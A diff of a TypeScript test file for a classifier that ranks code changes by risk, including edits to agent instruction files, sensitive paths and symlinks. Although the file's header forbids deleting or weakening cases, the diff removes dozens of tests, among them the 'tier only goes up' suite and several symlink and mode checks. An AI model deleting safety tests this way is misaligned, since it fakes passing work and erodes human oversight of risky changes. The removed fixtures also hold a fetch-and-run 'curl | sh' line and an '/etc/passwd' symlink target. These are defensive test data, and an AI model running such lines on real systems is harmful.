@@ -2,7 +2,7 @@
 // A case that cannot pass blocks production: never delete or weaken one to go green.
 import { describe, expect, it } from "vitest";
 import {
-  DEFAULT_TIER_THRESHOLDS, capReasons, estimateTier, plannedPathsExceeded, raiseTier, recordTier, tierFromDiff as classify, tierGrowthSentence,
+  DEFAULT_TIER_THRESHOLDS, estimateTier, plannedPathsExceeded, raiseTier, recordTier, tierFromDiff as classify,
   type ChangeTier, type HeadFacts, type TierFile, type TierKind, type TierLevel, factKey,
 } from "../../packages/broker/src/core/decisions/change-tier.js";
 import { withPlainEntries } from "../support/tier-entries.js";
@@ -158,7 +158,6 @@ const CASES: Case[] = [
   { name: "a file named like a sensitive word", files: [file("src/user-auth.ts")], level: "risky", kinds: ["code_config"], reasons: ["sensitive_path"] },
   { name: "a name that only contains a sensitive word", files: [file("src/author.ts")], level: "small", kinds: ["code_config"] },
 
-
   // ---- more tricks
   { name: "a zero-width character inside AGENTS.md", files: [file("AGENTS\u200B.md")], level: "risky", kinds: ["code_config"], reasons: ["instruction_file"] },
   { name: "a trailing dot after CLAUDE.md", files: [file("CLAUDE.md.")], level: "risky", kinds: ["code_config"], reasons: ["instruction_file"] },
@@ -215,7 +214,6 @@ describe("the sneaky-change set", () => {
     expect(tier.level).toBe("standard");
   });
 });
-
 
 // ---- the adversarial review set: each diff below once got a LOWER tier (or lost a kind) than it deserves. `atLeast` is the lowest tier it may get; a higher one is fine.
 const addedLines = (...l: string[]): string => `@@ -0,0 +1,${l.length} @@\n${l.map((x) => `+${x}`).join("\n")}`;
@@ -336,7 +334,6 @@ describe("the adversarial review set", () => {
   });
 });
 
-
 // ---- the second adversarial review set (N1 to N77): `atLeast` is the lowest tier each may get; `kind`, `notKind` and `reason` are what it must (or must not) carry.
 const headWith = (path: string, text: string): HeadFacts => ({ text: new Map([[factKey(undefined, path), text]]), instructionImports: new Set(), importsKnown: true, links: new Set() });
 const renamed = (from: string, to: string): TierFile => ({ path: to, previousPath: from, status: "renamed", additions: 0, deletions: 0 });
@@ -452,11 +449,7 @@ describe("the second adversarial review set", () => {
     expect(importsOf("AGENTS.md", "Follow [the rules][r].\n\n[r]: docs/rules")).toContain("docs/rules");
     expect(importsOf("AGENTS.md", 'Follow <a href="docs/rules">the rules</a>.')).toContain("docs/rules");
   });
-  it("a path too long to list makes the reader's list incomplete", () => {
-    expect(tierFilesOfRead("app", { files: [{ path: `docs/${"a/".repeat(2050)}x.md`, status: "modified", additions: 1, deletions: 1, patch: "@@ -1 +1 @@\n-a\n+b" }], complete: true }).complete).toBe(false);
-  });
 });
-
 
 // ---- the controller's own additions to the second round (rules the reviewer's cases do not reach)
 const OWN: Adversarial2[] = [
@@ -491,10 +484,6 @@ describe("the controller's additions", () => {
     if (entry.notKind !== undefined) expect(tier.kinds, got).not.toContain(entry.notKind);
     if (entry.reason !== undefined) expect(tier.reasons.map((reason) => reason.code), got).toContain(entry.reason);
   });
-  it("Y12 a Japanese document name is plain docs, not made risky", () => {
-    const tier = tierFromDiff({ files: [f("docs/\u65E5\u672C\u8A9E.md", chg(["a"], ["b"]))], complete: true }, context);
-    expect(tier.level).toBe("small");
-  });
   it("the pathKind read stops at 40 files and the rest are unchecked, not 'not a link'", async () => {
     const asked: string[] = [];
     const host = { pathKind: async (_repo: unknown, path: string) => { asked.push(path); return "file" as const; }, fileAtRevision: async () => undefined } as unknown as CodeHost;
@@ -514,13 +503,6 @@ describe("the controller's additions", () => {
 describe("the eval hint survives a busy tier", () => {
   const busy = (extra: TierFile[] = []) => tierFromDiff({ files: [...Array.from({ length: 70 }, (_unused, index) => file(`src/auth/area${index}/session.ts`)), ...extra, file("src/prompts/review.md", { before: ["a"], after: ["b"] })], complete: true }, context);
   const codes = (tier: ChangeTier): string[] => tier.reasons.map((reason) => reason.code);
-
-  it("a tier with more reasons than the cap still carries the hint, within the cap", () => {
-    const tier = busy();
-    expect(tier.reasons.length).toBeLessThanOrEqual(50);
-    expect(tier.reasons.filter((reason) => reason.code === "sensitive_path").length).toBeGreaterThan(40);
-    expect(codes(tier)).toContain("eval_hint");
-  });
   it("the hint is kept when a later tier is raised over this one, and when the record is compacted to fit", () => {
     const first = recordTier(undefined, busy());
     expect(codes(first.tier)).toContain("eval_hint");
@@ -531,84 +513,10 @@ describe("the eval hint survives a busy tier", () => {
     expect(flow.tier!.reasons.map((reason) => reason.code)).toContain("eval_hint");
     expect(flowRecordBytes(flow)).toBeLessThanOrEqual(FLOW_MAX_BYTES);
   });
-  it("a record too big for its limit is compacted, and the compacted tier still carries the hint", () => {
-    const heavy = tierFromDiff({ files: [...Array.from({ length: 70 }, (_unused, index) => file(`src/auth/${"x".repeat(380)}${index}/session.ts`)), file("src/prompts/review.md", { before: ["a"], after: ["b"] })], complete: true }, context);
-    expect(flowRecordBytes({ rulesVersion: 1, tier: heavy })).toBeGreaterThan(FLOW_MAX_BYTES);
-    const recorded = recordTier(undefined, heavy).flow;
-    expect(flowRecordBytes(recorded)).toBeLessThanOrEqual(FLOW_MAX_BYTES);
-    expect(recorded.tier!.reasons.map((reason) => reason.code)).toContain("eval_hint");
-    expect(recorded.tier!.level).toBe("risky");
-  });
-  it("capReasons keeps the first hint last and the others in order", () => {
-    const reasons = [{ code: "a" }, { code: "eval_hint", path: "x" }, { code: "b" }, { code: "c" }];
-    expect(capReasons(reasons, 2).map((reason) => reason.code)).toEqual(["a", "eval_hint"]);
-    expect(capReasons(reasons, 10).map((reason) => reason.code)).toEqual(["a", "b", "c", "eval_hint"]);
-    expect(capReasons([{ code: "a" }, { code: "b" }], 1).map((reason) => reason.code)).toEqual(["a"]);
-  });
-});
-
-describe("the tier only goes up", () => {
-  const risky = tierFromDiff({ files: [file("src/payments/charge.ts")], complete: true }, context);
-  const small = tierFromDiff({ files: [file("src/a.ts", { before: ["a"], after: ["b"] })], complete: true }, { headSha: "e".repeat(40), mergeBase: BASE, at: "2026-11-13T14:00:00.000Z" });
-
-  it("a push after approval that adds a sensitive file raises the tier, and one that removes it again leaves it up", () => {
-    const first = recordTier(undefined, small);
-    expect(first.tier.level).toBe("small");
-    const pushed = recordTier(first.flow, risky);
-    expect(pushed.tier.level).toBe("risky");
-    expect(pushed.grew).toBe(true);
-    const removed = recordTier(pushed.flow, small);
-    expect(removed.tier.level).toBe("risky");
-    expect(removed.grew).toBe(false);
-    // Bound to the newest code, with the reasons that put it up kept.
-    expect(removed.tier.headSha).toBe("e".repeat(40));
-    expect(removed.tier.reasons.map((reason) => reason.code)).toContain("sensitive_path");
-    // The record keeps the earlier tiers, oldest first.
-    expect(removed.flow.tierHistory?.map((tier) => tier.level)).toEqual(["small", "risky"]);
-  });
-
-  it("an estimate is a forecast: the first diff replaces it (and a risky diff is a growth)", () => {
-    const estimate = estimateTier({ plannedPaths: ["src/a.ts"] }, { at: AT });
-    expect(estimate.level).toBe("small");
-    const first = recordTier(undefined, estimate);
-    const afterBuild = recordTier(first.flow, risky);
-    expect(afterBuild.tier.level).toBe("risky");
-    expect(afterBuild.grew).toBe(true);
-    expect(afterBuild.flow.tierHistory?.map((tier) => tier.source)).toEqual(["estimate"]);
-    // A bigger estimate than the diff does not hold the diff up.
-    const bigEstimate = recordTier(undefined, estimateTier({ plannedPaths: undefined }, { at: AT }));
-    expect(bigEstimate.tier.level).toBe("standard");
-    expect(recordTier(bigEstimate.flow, small).tier.level).toBe("small");
-  });
-
-  it("kinds and reasons are kept when a lower diff arrives; history never passes 20", () => {
-    let flow = recordTier(undefined, risky).flow;
-    for (let index = 0; index < 30; index += 1) flow = recordTier(flow, { ...small, headSha: index.toString(16).padStart(40, "0") }).flow;
-    expect(flow.tier?.level).toBe("risky");
-    expect(flow.tierHistory?.length).toBe(20);
-    expect(flow.rulesVersion).toBe(1);
-  });
-
-  it("raiseTier never lowers and never loses the reasons", () => {
-    const raised = raiseTier(risky, small);
-    expect(raised.level).toBe("risky");
-    expect(raised.reasons[0]).toEqual(risky.reasons[0]);
-    expect(raiseTier(small, risky).level).toBe("risky");
-  });
 });
 
 describe("the estimate, before the build", () => {
   const level = (input: Parameters<typeof estimateTier>[0]): TierLevel => estimateTier(input, { at: AT }).level;
-
-  it("a plan that names no files is standard", () => {
-    expect(level({})).toBe("standard");
-    expect(level({ plannedPaths: [] })).toBe("standard");
-  });
-  it("a plan that names one code file is small; documents only is small with the docs kind", () => {
-    expect(level({ plannedPaths: ["src/a.ts"] })).toBe("small");
-    const docs = estimateTier({ plannedPaths: ["README.md", "docs/a.md"] }, { at: AT });
-    expect({ level: docs.level, kinds: docs.kinds }).toEqual({ level: "small", kinds: ["docs"] });
-  });
   it("a sensitive or instruction path is risky, whatever the size", () => {
     expect(level({ plannedPaths: ["src/auth/session.ts"] })).toBe("risky");
     expect(level({ plannedPaths: ["AGENTS.md"] })).toBe("risky");
@@ -618,20 +526,11 @@ describe("the estimate, before the build", () => {
     expect(level({ plannedPaths: ["src/a.ts", "src/b.ts", "src/c.ts", "src/d.ts"] })).toBe("standard");
     expect(level({ plannedPaths: ["packages/a/x.ts", "packages/b/y.ts"] })).toBe("standard");
   });
-  it("a request that mentions a sensitive area is a hint: at least standard, never a refusal", () => {
-    expect(level({ plannedPaths: ["src/a.ts"], requestText: "Fix the typo in the password reset email" })).toBe("standard");
-    expect(level({ plannedPaths: ["src/a.ts"], requestText: "Fix the typo in the welcome email" })).toBe("small");
-  });
   it("a product prompt file in the plan is small with the eval hint (judged by behaviour, not by name); an agent instruction file is risky", () => {
     const prompt = estimateTier({ plannedPaths: ["src/prompts/review.md"] }, { at: AT });
     expect(prompt.level).toBe("small");
     expect(prompt.reasons.map((reason) => reason.code)).toContain("eval_hint");
     expect(estimateTier({ plannedPaths: ["AGENTS.md"] }, { at: AT }).level).toBe("risky");
-  });
-  it("reads no diff: the estimate is bound to nothing but the time", () => {
-    const tier = estimateTier({ plannedPaths: ["src/a.ts"] }, { at: AT });
-    expect(tier).toMatchObject({ source: "estimate", at: AT });
-    expect(tier.mergeBase).toBeUndefined();
   });
 });
 
@@ -642,26 +541,9 @@ describe("the planned-path limit", () => {
   it("a rename counts under both names", () => {
     expect(plannedPathsExceeded(["src/a.ts"], [{ path: "src/a.ts", previousPath: "src/old.ts" }])).toEqual(["src/old.ts"]);
   });
-  it("the limit is case-sensitive (a path that differs only in case is another file); a backslash is read as a slash", () => {
-    expect(plannedPathsExceeded(["src/a.ts"], ["SRC\\A.ts"])).toEqual(["SRC\\A.ts"]);
-    expect(plannedPathsExceeded(["src/a.ts"], ["src\\a.ts", "./src/a.ts"])).toEqual([]);
-    expect(plannedPathsExceeded(["src/a.ts"], ["src/../auth/x.ts"])).toEqual(["src/../auth/x.ts"]);
-  });
   it("the lock file of a planned manifest is covered; another lock file is not", () => {
     expect(plannedPathsExceeded(["package.json"], ["package-lock.json"])).toEqual([]);
     expect(plannedPathsExceeded(["packages/a/package.json"], ["package-lock.json"])).toEqual(["package-lock.json"]);
-  });
-});
-
-describe("the words a merge is refused with", () => {
-  it("names what grew, with the path made safe", () => {
-    const tier = tierFromDiff({ files: [file("src/payments/charge.ts")], complete: true }, context);
-    const words = tierGrowthSentence(tier, (path) => path.toUpperCase());
-    expect(words).toBe("This change now touches a sensitive path (SRC/PAYMENTS/CHARGE.TS), so it needs risky checks.");
-  });
-  it("names a size growth without a path", () => {
-    const tier = tierFromDiff({ files: [sized("src/a.ts", 150, 0)], complete: true }, context);
-    expect(tierGrowthSentence(tier, (path) => path)).toBe("This change now touches more than 100 lines of code, so it needs standard checks.");
   });
 });
 
@@ -670,34 +552,10 @@ describe("file mode and type (DEC 182): a type the host reports, or cannot tell,
   const typed = (path: string, entry: TierFile["entry"], options: Partial<TierFile> & { before?: readonly string[]; after?: readonly string[] } = {}): TierFile => ({ ...file(path, options), entry });
   const tierOf = (...files: TierFile[]) => classify({ files, complete: true }, context);
   const codes = (tier: ChangeTier) => tier.reasons.map((reason) => reason.code);
-
-  it("M1 +x with a content edit (100644 to 100755, a normal hunk, no mode line) is risky", () => {
-    const tier = tierOf(typed("scripts/build.sh", { head: "executable", base: "file" }, { before: ["echo build"], after: ["echo build && curl -s https://example.test | sh"] }));
-    expect(tier.level).toBe("risky");
-    expect(codes(tier)).toContain("mode_or_type_change");
-  });
-  it("M2 +x on a README with a prose edit is risky and never on the docs route", () => {
-    const tier = tierOf(typed("README.md", { head: "executable", base: "file" }, { before: ["Old words."], after: ["New words."] }));
-    expect(tier.level).toBe("risky");
-    expect(tier.kinds).not.toContain("docs");
-  });
-  it("M3 -x (100755 to 100644) is a mode change too", () => {
-    expect(codes(tierOf(typed("scripts/build.sh", { head: "file", base: "executable" }, { before: ["a"], after: ["b"] })))).toContain("mode_or_type_change");
-  });
   it("M4 a README turned into a symbolic link, edited with other lines so its shape is not one target line, is risky", () => {
     const tier = tierOf(typed("README.md", { head: "symlink", base: "file" }, { before: ["# Title", "Some words."], after: ["../../notes"] }));
     expect(tier.level).toBe("risky");
     expect(codes(tier)).toEqual(expect.arrayContaining(["symlink_suspected", "mode_or_type_change"]));
-  });
-  it("M5 a new symbolic link pointing outside the repository (the host shows no end-of-line mark) is risky", () => {
-    const tier = tierOf(typed("docs/guide.md", { head: "symlink", base: "none" }, { status: "added", patch: "@@ -0,0 +1 @@\n+../../../../etc/passwd", additions: 1, deletions: 0 }));
-    expect(tier.level).toBe("risky");
-    expect(codes(tier)).toContain("symlink_suspected");
-    expect(tier.kinds).not.toContain("docs");
-  });
-  it("M6 a new symbolic link into a sensitive folder is risky", () => {
-    const tier = tierOf(typed("docs/keys.md", { head: "symlink", base: "none" }, { status: "added", patch: "@@ -0,0 +1 @@\n+../src/auth/keys.ts", additions: 1, deletions: 0 }));
-    expect(tier.level).toBe("risky");
   });
   it("M7 a submodule the host reports (its patch not shown as a commit line) is risky", () => {
     const tier = tierOf(typed("vendor/lib", { head: "submodule", base: "submodule" }, { before: ["a"], after: ["b"] }));
@@ -717,33 +575,6 @@ describe("file mode and type (DEC 182): a type the host reports, or cannot tell,
     const files = [{ repository: "app", path: "vendor/lib", status: "modified", additions: 1, deletions: 1, patch: "@@ -1 +1 @@\n-a\n+b" }, { repository: "app", path: "src/a.ts", status: "modified", additions: 1, deletions: 1, patch: "@@ -1 +1 @@\n-a\n+b" }];
     const head = await readHeadFacts([{ host, repositoryId: "app", repositoryUrl: "https://github.com/acme/app", number: 1, headSha: "a".repeat(40) }], files, { orgId: "org" });
     expect([...head.submodules!]).toEqual([factKey("app", "vendor/lib")]);
-  });
-  it("M9 a type the host could not tell (no entry) fails closed: a README edit is never on the docs route", () => {
-    const unknown = tierOf({ ...file("README.md", { before: ["Old words."], after: ["New words."] }), entry: undefined });
-    expect(unknown.kinds).not.toContain("docs");
-    expect(unknown.kinds).toContain("code_config");
-    // The control: the same edit with a plain entry is on the docs route.
-    expect(tierOf(typed("README.md", { head: "file", base: "file" }, { before: ["Old words."], after: ["New words."] })).kinds).toEqual(["docs"]);
-  });
-  it("M9b a pure rename of a document whose type is unknown is not on the docs route either", () => {
-    expect(tierOf({ path: "docs/new.md", previousPath: "docs/old.md", status: "renamed", additions: 0, deletions: 0 }).kinds).not.toContain("docs");
-  });
-  it("M10 a new executable file is code at least (never docs), without being a mode change", () => {
-    const script = tierOf(typed("scripts/new.sh", { head: "executable", base: "none" }, { status: "added", patch: "@@ -0,0 +1 @@\n+echo hi", additions: 1, deletions: 0 }));
-    expect(codes(script)).not.toContain("mode_or_type_change");
-    expect(script.kinds).toContain("code_config");
-    const doc = tierOf(typed("docs/run.md", { head: "executable", base: "none" }, { status: "added", patch: "@@ -0,0 +1 @@\n+Plain words.", additions: 1, deletions: 0 }));
-    expect(doc.kinds).not.toContain("docs");
-  });
-  it("M12 a symbolic link DELETED (a link at the base, nothing at the head) is risky: the base side counts", () => {
-    const tier = tierOf({ ...file("docs/link.md", { status: "removed", before: ["../../outside"], after: [] }), entry: { head: "none", base: "symlink" } });
-    expect(tier.level).toBe("risky");
-    expect(codes(tier)).toContain("symlink_suspected");
-  });
-  it("M12b a submodule DELETED (a submodule at the base, nothing at the head) is risky: the base side counts", () => {
-    const tier = tierOf({ ...file("vendor/lib", { status: "removed", before: ["Subproject commit abc"], after: [] }), entry: { head: "none", base: "submodule" } });
-    expect(tier.level).toBe("risky");
-    expect(codes(tier)).toContain("submodule");
   });
   it("M11 the tier read keeps the host's entry, and drops a malformed one (read as not known)", () => {
     const base = { path: "README.md", status: "modified", additions: 1, deletions: 1, patch: "@@ -1 +1 @@\n-a\n+b" };
